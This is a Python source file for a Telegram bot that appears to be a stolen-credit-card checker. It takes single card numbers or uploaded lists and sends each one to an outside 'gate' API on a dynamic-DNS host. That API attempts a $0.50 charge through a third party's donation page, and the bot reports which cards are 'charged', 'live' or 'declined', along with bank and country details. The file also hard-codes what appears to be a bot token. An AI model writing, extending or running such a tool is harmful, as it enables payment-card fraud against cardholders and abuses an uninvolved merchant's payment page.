import os
import re
import requests
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = '8692960014:AAEpYPo0XTj8F2DmAeUgdaf9_w06MWFYDeI'
API_URL = "http://gatescheck.duckdns.org:7000/check"

stop_users = {}

# ------------------- BIN Lookup -------------------
def get_bin_info(bin_number):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
        data = r.json()
        brand = data.get("scheme", "N/A")
        card_type = data.get("type", "N/A")
        bank = data.get("bank", {}).get("name", "N/A")
        country = data.get("country", {}).get("name", "N/A")
        info = f"{brand} - {card_type}"
        return info, bank, country
    except:
        return "N/A", "N/A", "N/A"

# ------------------- Check API -------------------
def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params, timeout=20)
        result = response.json().get('result', 'Unknown').lower()

        if "charge" in result or "success" in result:
            return "approved", "Charge"
        elif "insufficient" in result:
            return "live", "Insufficient Funds"
        else:
            return "declined", "Declined"

    except Exception as e:
        return "declined", f"Error: {e}"

# ------------------- Format Response -------------------
def format_response(card, status, response, taken):
    bin_number = card[:6]
    info, bank, country = get_bin_info(bin_number)

    if status == "approved":
        title = "#Paypal_Cvv_Charged☠"
        stat = "APPROVED ✅"
    elif status == "live":
        title = "#Paypal_Live🟢"
        stat = "LIVE 🟢"
    else:
        title = "#Paypal_Declined❌"
        stat = "DECLINED ❌"

    text = f"""{title} [/pp] ($0.50)
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐂𝐚𝐫𝐝: {card}
[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {stat}
[ϟ] 𝐓𝐚𝐤𝐞𝐧: {taken}s
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐈𝐧𝐟𝐨: {info}
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
- - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝐓𝐢𝐦𝐞: {taken} Sec."""
    return text

# ------------------- /pp -------------------
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card = " ".join(context.args)
    if not card:
        await update.message.reply_text("Usage:\n/pp 4242424242424242")
        return

    start_time = time.time()
    status, response = check_card_api(card)
    taken = round(time.time() - start_time, 2)

    text = format_response(card, status, response, taken)
    await update.message.reply_text(text)

# ------------------- /stop -------------------
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- File Handler -------------------
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    if not os.path.exists('downloads'):
        os.makedirs('downloads')

    file = await update.message.document.get_file()
    file_path = f"downloads/{file.file_id}.txt"
    await file.download_to_drive(file_path)

    approved = 0
    live = 0
    declined = 0

    panel_msg = await update.message.reply_text("Start Checking... 🔍")

    with open(file_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    for line in lines:
        if stop_users.get(user_id):
            await update.message.reply_text("Stopped ⛔")
            return

        line = line.strip()
        match = re.findall(r'\d+', line)
        if not match:
            continue

        card = match[0]
        start_time = time.time()
        status, response = check_card_api(card)
        taken = round(time.time() - start_time, 2)

        text = format_response(card, status, response, taken)
        await update.message.reply_text(text)

        # Update counters
        if status == "approved":
            approved += 1
        elif status == "live":
            live += 1
        else:
            declined += 1

        panel = f"""📊 Status

✅ Charge: {approved}
🟢 Live: {live}
❌ Declined: {declined}
⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
"""
        await panel_msg.edit_text(panel)

    await update.message.reply_text("Done ✅")

# ------------------- Start -------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot Ready ✅")

# ------------------- Run -------------------
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == "__main__":
    main()
